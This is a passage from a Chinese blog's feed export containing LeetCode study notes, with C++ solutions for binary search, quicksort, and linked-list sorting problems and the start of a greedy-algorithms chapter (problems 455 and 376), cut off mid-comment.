class="keyword">if</span>(nums[mid]&lt;target)</span><br><span class="line">                l=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;first,last&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="367-有效的完全平方数——二分法"><a href="#367-有效的完全平方数——二分法" class="headerlink" title="367 有效的完全平方数——二分法"></a>367 有效的完全平方数——二分法</h3><p>给你一个正整数 num 。如果 num 是一个完全平方数，则返回 true ，否则返回 false 。<br>【<strong>完全平方数</strong>】：是一个可以写成某个整数的平方的整数。换句话说，它可以写成某个整数和自身的乘积。<br>不能使用任何内置的库函数，如  sqrt 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isPerfectSquare</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=num;<span class="comment">//r=num;</span></span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid=l+(r-l)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>((<span class="keyword">long</span> <span class="keyword">long</span>) mid*mid==num)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>((<span class="keyword">long</span> <span class="keyword">long</span>) mid*mid&lt;num)</span><br><span class="line">                l=mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="35-搜索插入位置——二分法【有序】"><a href="#35-搜索插入位置——二分法【有序】" class="headerlink" title="35 搜索插入位置——二分法【有序】"></a>35 搜索插入位置——二分法【有序】</h3><p>给定一个<strong>排序数组</strong>和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。<br>请必须使用时间复杂度为 O(log n) 的算法。<br><strong>有序——二分法</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    二分法——有序数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">searchInsert</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>,right = nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (left+right)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; target)</span><br><span class="line">                left = mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[mid] &gt; target)</span><br><span class="line">                right = mid<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="33-搜索旋转排序数组——有序-二分法O-logn"><a href="#33-搜索旋转排序数组——有序-二分法O-logn" class="headerlink" title="33 搜索旋转排序数组——有序-二分法O(logn)"></a>33 搜索旋转排序数组——有序-二分法O(logn)</h3><p>整数数组 nums 按升序排列，数组中的值 互不相同 。<br>例如，[0,1,2,4,5,6,7] 在下标 3 处经旋转后可能变为 [4,5,6,7,0,1,2] 。<br>给你 旋转后 的数组 nums 和一个整数 target ，如果 nums 中存在这个目标值 target ，则返回它的下标，否则返回 -1 。<br>你必须<strong>设计一个时间复杂度为 O(log n) 的算法解决此问题</strong>。<br><strong>有序想到 二分！！！</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(!n) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)   <span class="keyword">return</span> nums[<span class="number">0</span>]==target?<span class="number">0</span>:<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            <span class="keyword">if</span>(nums[<span class="number">0</span>]&lt;=nums[mid])&#123;<span class="comment">//左部分 有序</span></span><br><span class="line">                <span class="keyword">if</span>(nums[<span class="number">0</span>]&lt;=target &amp;&amp; target&lt;nums[mid])</span><br><span class="line">                    r = mid<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    l = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[mid]&lt;target &amp;&amp; target&lt;=nums[n<span class="number">-1</span>])</span><br><span class="line">                    l = mid+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span>    </span><br><span class="line">                    r = mid<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="153-寻找旋转排序数组中的最小值-有序-二分O-logn"><a href="#153-寻找旋转排序数组中的最小值-有序-二分O-logn" class="headerlink" title="153 寻找旋转排序数组中的最小值-有序-二分O(logn)"></a>153 寻找旋转排序数组中的最小值-有序-二分O(logn)</h3><p>给你一个元素值 互不相同 的数组 nums ，它原来是一个升序排列的数组，并进行了多次旋转。请你找出并返回数组中的 最小元素 。<br>eg: 原数组 nums = [0,1,2,4,5,6,7] 在变化后可能得到：</p><pre><code>若旋转 4 次，则可以得到 [4,5,6,7,0,1,2]若旋转 7 次，则可以得到 [0,1,2,4,5,6,7]</code></pre><p>你必须<strong>设计一个时间复杂度为 O(log n) 的算法解决此问题</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//官方！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findMin</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = l+(r-l)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]&lt;nums[r])&#123;</span><br><span class="line">                r = mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                l = mid+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums[l];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="215-数组中的第K个最大元素——快排"><a href="#215-数组中的第K个最大元素——快排" class="headerlink" title="215 数组中的第K个最大元素——快排"></a>215 数组中的第K个最大元素——快排</h3><p><strong>数组：求 第k大 元素[n-k]</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//升序序列：第k个最大的元素，倒着第k个元素，[n-k]</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums,<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">        <span class="keyword">if</span>(l&gt;=r)<span class="comment">//子数组长度是1，终止递归</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">//哨兵是 nums[l]</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;j)&#123;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; nums[j]&gt;=nums[l]) j--;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;j &amp;&amp; nums[i]&lt;=nums[l]) i++;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i],nums[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(nums[i],nums[l]);<span class="comment">//或者swap(nums[j],nums[l])，为了把nums[l]放到合适位置即 i或j</span></span><br><span class="line">        <span class="comment">//递归左右划分</span></span><br><span class="line">        <span class="built_in">quickSort</span>(nums,l,i<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">quickSort</span>(nums,i+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">quickSort</span>(nums,<span class="number">0</span>,nums.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> nums[nums.<span class="built_in">size</span>()-k];<span class="comment">//倒着第k个元素</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="148-排序链表——链表归并排序-升序"><a href="#148-排序链表——链表归并排序-升序" class="headerlink" title="148 排序链表——链表归并排序-升序"></a>148 排序链表——链表归并排序-升序</h3><p>【<strong>时间复杂度是 O(nlog⁡n) 的排序算法</strong>】</p><ul><li>归并排序、堆排序、快速排序</li><li>（快速排序的最差时间复杂度是 O(n^2)</li><li>最适合<code>链表</code>的排序算法是 <strong>归并排序</strong>。</li></ul><p><strong>对链表自顶向下归并排序的过程如下：</strong></p><pre><code>找到链表的中点，以中点为分界，将链表拆分成两个子链表。【快慢指针】对两个子链表分别排序将两个排序后的子链表合并</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//归并排序 sort() merge()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">sortList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">sort</span>(head,<span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">sort</span><span class="params">(ListNode* head, ListNode* tail)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;next==tail)&#123;</span><br><span class="line">            head-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//只有head一个结点</span></span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//快慢指针 寻找中间位置</span></span><br><span class="line">        ListNode* slow = head, *fast = head;</span><br><span class="line">        <span class="keyword">while</span>(fast!=tail)&#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            <span class="keyword">if</span>(fast!=tail)</span><br><span class="line">                fast = fast-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *mid = slow;<span class="comment">//中间结点</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">merge</span>(<span class="built_in">sort</span>(head,mid),<span class="built_in">sort</span>(mid,tail));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">merge</span><span class="params">(ListNode *head1, ListNode* head2)</span></span>&#123;</span><br><span class="line">        ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        ListNode *temp = dummyHead, *t1 = head1, *t2 = head2;</span><br><span class="line">        <span class="keyword">while</span>(t1!=<span class="literal">nullptr</span> &amp;&amp; t2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(t1-&gt;val&lt;=t2-&gt;val)&#123;</span><br><span class="line">                temp-&gt;next = t1;</span><br><span class="line">                t1 = t1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                temp-&gt;next = t2;</span><br><span class="line">                t2 = t2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//排完之后，若t1和t2两链表不等长，则必有一个剩余，之间连在temp之后即可</span></span><br><span class="line">        <span class="keyword">if</span>(t1!=<span class="literal">nullptr</span>)</span><br><span class="line">            temp-&gt;next = t1;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t2!=<span class="literal">nullptr</span>)</span><br><span class="line">            temp-&gt;next = t2;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>###</strong> <strong>147 对链表进行插入排序</strong></p><p>给定单个链表的头 head ，使用 <code>插入排序</code> 对链表进行排序，并返回 排序后链表的头。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">insertionSortList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//递增排序</span></span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        <span class="comment">//引入哑节点是为了便于在 head 节点之前插入节点</span></span><br><span class="line">        ListNode *dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyHead-&gt;next = head;</span><br><span class="line"><span class="comment">/*下面这两句中*/</span></span><br><span class="line">        ListNode *lastSorted = head;<span class="comment">//有序列表中最好一个结点</span></span><br><span class="line">        ListNode *p=head-&gt;next;<span class="comment">//待插入结点  //这里忘记了 头结点没有 数值</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="comment">//Sorted-&gt;是第一个数，第一个数当然不能是dummyHead</span></span><br><span class="line">            <span class="keyword">if</span>(p-&gt;val&lt;lastSorted-&gt;val)&#123;<span class="comment">//待插结点 小于 前面，从头开始寻找插入位置</span></span><br><span class="line">                ListNode *pre = dummyHead;<span class="comment">//注意这里配合下面的 pre-&gt;next-&gt;val使用</span></span><br><span class="line">                <span class="keyword">while</span>(pre-&gt;next-&gt;val &lt;= p-&gt;val)</span><br><span class="line">                    pre = pre-&gt;next;<span class="comment">//找到前驱</span></span><br><span class="line">                lastSorted-&gt;next= p-&gt;next;</span><br><span class="line">                p-&gt;next=pre-&gt;next;</span><br><span class="line">                pre-&gt;next=p;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                lastSorted = lastSorted-&gt;next;<span class="comment">//待插结点 大于= 前面，不插入，直接将last后移 </span></span><br><span class="line">            &#125;</span><br><span class="line">            p=lastSorted-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>十一、贪心</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E5%8D%81%E4%B8%80%E3%80%81%E8%B4%AA%E5%BF%83/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E5%8D%81%E4%B8%80%E3%80%81%E8%B4%AA%E5%BF%83/</id>
    <published>2025-12-03T06:16:46.000Z</published>
    <updated>2025-12-03T06:16:43.471Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="十一、贪心"><a href="#十一、贪心" class="headerlink" title="十一、贪心"></a>十一、贪心</h2><p>eg:取钞票<br>【局部最优】-&gt;【全局最优】</p><h3 id="455-分发饼干"><a href="#455-分发饼干" class="headerlink" title="455 分发饼干"></a>455 分发饼干</h3><p>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，【每个孩子最多只能给一块饼干】【注意！！！】。<br>对每个孩子 i，都有一个胃口值 g[i]，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 j，都有一个尺寸 s[j] 。如果 s[j] &gt;= g[i]，我们可以将这个饼干 j 分配给孩子 i ，这个孩子会得到满足。<br><strong>尽可能满足越多数量的孩子</strong>，并<strong>输出这个最大数值</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    策略：【用大饼干】 尽可能胃 【大胃口的孩子】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findContentChildren</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; child, vector&lt;<span class="keyword">int</span>&gt;&amp; cookie)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n_ch = child.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n_si = cookie.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(child.<span class="built_in">begin</span>(),child.<span class="built_in">end</span>());<span class="comment">//升序排序</span></span><br><span class="line">        <span class="built_in">sort</span>(cookie.<span class="built_in">begin</span>(),cookie.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> index = n_si<span class="number">-1</span>;<span class="comment">//遍历 饼干</span></span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;<span class="comment">//记录结果 ：满足胃口的孩子个数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n_ch<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">//判断当前饼干是否 满足 当前孩子胃口</span></span><br><span class="line">            <span class="keyword">if</span>(index&gt;=<span class="number">0</span> &amp;&amp; cookie[index]&gt;=child[i])&#123;</span><br><span class="line">                res++;<span class="comment">//满足：结果++</span></span><br><span class="line">                index--;</span><br><span class="line">            &#125;       </span><br><span class="line">            <span class="comment">//不满足：去看是否满足下一个孩子i++</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findContentChildren</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; g, vector&lt;<span class="keyword">int</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(g.<span class="built_in">begin</span>(),g.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(),s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123; <span class="comment">// 饼干</span></span><br><span class="line">            <span class="keyword">if</span>(index &lt; g.<span class="built_in">size</span>() &amp;&amp; g[index] &lt;= s[i])&#123; <span class="comment">// 胃口</span></span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="376-摆动序列"><a href="#376-摆动序列" class="headerlink" title="376 摆动序列"></a>376 摆动序列</h3><p>如果连续数字之间的差严格地在<strong>正数和负数之间交替</strong>，则数字序列称为 摆动序列 。【第一个差】（如果存在的话）可能是正数或负数。【仅有一个元素或者含两个不等元素的序列】也视作摆动序列。</p><pre><code>例如， [1, 7, 4, 9, 2, 5] 是一个 摆动序列 ，因为差值 (6, -3, 5, -7, 3) 是正负交替出现的。相反，[1, 4, 7, 2, 5] 和 [1, 7, 4, 5, 5] 不是摆动序列，第一个序列是因为它的前两个差值都是正数，第二个序列是因为它的最后一个差值为零。</code></pre><p>子序列 可以通过从原始序列中删除一些（也可以不删除）元素来获得，剩下的元素保持其原始顺序。</p><p>给你一个整数数组 nums ，返回 nums 中<strong>作为 摆动序列 的 最长子序列的长度</strong> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    举例：[1,17,5,10,13,15,10,5,16,8]</span></span><br><span class="line"><span class="comment">      17    </span></span><br><span class="line"><span class="comment">                    16</span></span><br><span class="line"><span class="comment">              15</span></span><br><span class="line"><span class="comment">            13</span></span><br><span class="line"><span class="comment">          10    10</span></span><br><span class="line"><span class="comment">                        8</span></span><br><span class="line"><span class="comment">        5         5     </span></span><br><span class="line"><span class="comment">     1</span></span><br><span class="line"><span class="comment">     需要把单调递增的序列中间元素删掉，只保留最大和最小峰值的元素，个数即为 结果序列长度</span></span><br><span class="line"><span class="comment">     实际上：</span></span><br><span class="line"><span class="comment">        不必真的去删除 元素</span></span><br><span class="line"><span class="comment">    思路：</span></span><br><span class="line"><span class="comment">        